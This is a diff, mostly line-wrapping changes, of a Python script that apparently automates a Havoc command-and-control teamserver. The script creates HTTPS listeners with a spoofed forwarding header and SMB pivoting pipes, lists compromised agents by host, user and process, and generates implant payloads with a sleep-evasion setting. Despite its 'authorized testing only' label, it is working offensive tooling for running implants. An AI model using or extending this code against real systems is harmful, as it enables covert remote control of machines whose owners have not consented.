@@ -11,7 +11,9 @@ from datetime import datetime
 
 import requests
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s"
+)
 logger = logging.getLogger(__name__)
 
 HAVOC_DEFAULT_PORT = 40056
@@ -25,7 +27,9 @@ def havoc_api_request(teamserver, endpoint, token, method="GET", data=None):
         if method == "GET":
             resp = requests.get(url, headers=headers, timeout=15, verify=False)
         else:
-            resp = requests.post(url, headers=headers, json=data or {}, timeout=15, verify=False)
+            resp = requests.post(
+                url, headers=headers, json=data or {}, timeout=15, verify=False
+            )
         resp.raise_for_status()
         return resp.json()
     except requests.RequestException as e:
@@ -41,7 +45,9 @@ def list_listeners(teamserver, token):
     return listeners
 
 
-def create_https_listener(teamserver, token, name, bind_addr, bind_port, hosts, secure=True):
+def create_https_listener(
+    teamserver, token, name, bind_addr, bind_port, hosts, secure=True
+):
     """Create an HTTPS listener."""
     config = {
         "name": name,
@@ -53,7 +59,9 @@ def create_https_listener(teamserver, token, name, bind_addr, bind_port, hosts, 
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "headers": ["Content-Type: application/json", "X-Forwarded-For: 127.0.0.1"],
     }
-    result = havoc_api_request(teamserver, "listeners", token, method="POST", data=config)
+    result = havoc_api_request(
+        teamserver, "listeners", token, method="POST", data=config
+    )
     logger.info("Created HTTPS listener '%s' on %s:%d", name, bind_addr, bind_port)
     return result
 
@@ -61,7 +69,9 @@ def create_https_listener(teamserver, token, name, bind_addr, bind_port, hosts, 
 def create_smb_listener(teamserver, token, name, pipe_name):
     """Create an SMB named pipe listener for pivoting."""
     config = {"name": name, "protocol": "Smb", "pipe_name": pipe_name}
-    result = havoc_api_request(teamserver, "listeners", token, method="POST", data=config)
+    result = havoc_api_request(
+        teamserver, "listeners", token, method="POST", data=config
+    )
     logger.info("Created SMB listener '%s' on pipe %s", name, pipe_name)
     return result
 
@@ -71,9 +81,19 @@ def list_agents(teamserver, token):
     data = havoc_api_request(teamserver, "agents", token)
     agents = data.get("agents", [])
     logger.info("Found %d connected agents", len(agents))
-    return [{"id": a.get("agent_id"), "hostname": a.get("hostname"), "username": a.get("username"),
-             "os": a.get("os"), "process": a.get("process_name"), "pid": a.get("pid"),
-             "last_callback": a.get("last_callback"), "sleep": a.get("sleep")} for a in agents]
+    return [
+        {
+            "id": a.get("agent_id"),
+            "hostname": a.get("hostname"),
+            "username": a.get("username"),
+            "os": a.get("os"),
+            "process": a.get("process_name"),
+            "pid": a.get("pid"),
+            "last_callback": a.get("last_callback"),
+            "sleep": a.get("sleep"),
+        }
+        for a in agents
+    ]
 
 
 def generate_payload(teamserver, token, listener_name, payload_type="exe", arch="x64"):
@@ -90,7 +110,9 @@ def generate_payload(teamserver, token, listener_name, payload_type="exe", arch=
             "sleep_technique": "WaitForSingleObjectEx",
         },
     }
-    result = havoc_api_request(teamserver, "payloads/generate", token, method="POST", data=config)
+    result = havoc_api_request(
+        teamserver, "payloads/generate", token, method="POST", data=config
+    )
     logger.info("Generated %s payload for listener '%s'", payload_type, listener_name)
     return result
 
@@ -127,17 +149,26 @@ def generate_report(listeners, agents, assessment):
         "agents": agents,
         "infrastructure_assessment": assessment,
     }
-    print(f"C2 REPORT: {len(listeners)} listeners, {len(agents)} agents, "
-          f"{len(assessment.get('recommendations', []))} recommendations")
+    print(
+        f"C2 REPORT: {len(listeners)} listeners, {len(agents)} agents, "
+        f"{len(assessment.get('recommendations', []))} recommendations"
+    )
     return report
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Havoc C2 Infrastructure Builder (authorized testing only)")
-    parser.add_argument("--teamserver", required=True, help="Teamserver address (host:port)")
+    parser = argparse.ArgumentParser(
+        description="Havoc C2 Infrastructure Builder (authorized testing only)"
+    )
+    parser.add_argument(
+        "--teamserver", required=True, help="Teamserver address (host:port)"
+    )
     parser.add_argument("--token", required=True, help="API authentication token")
-    parser.add_argument("--action", choices=["status", "create-listener", "generate-payload", "full-report"],
-                        default="full-report")
+    parser.add_argument(
+        "--action",
+        choices=["status", "create-listener", "generate-payload", "full-report"],
+        default="full-report",
+    )
     parser.add_argument("--listener-name", default="https-primary")
     parser.add_argument("--bind-port", type=int, default=443)
     parser.add_argument("--output", default="havoc_c2_report.json")
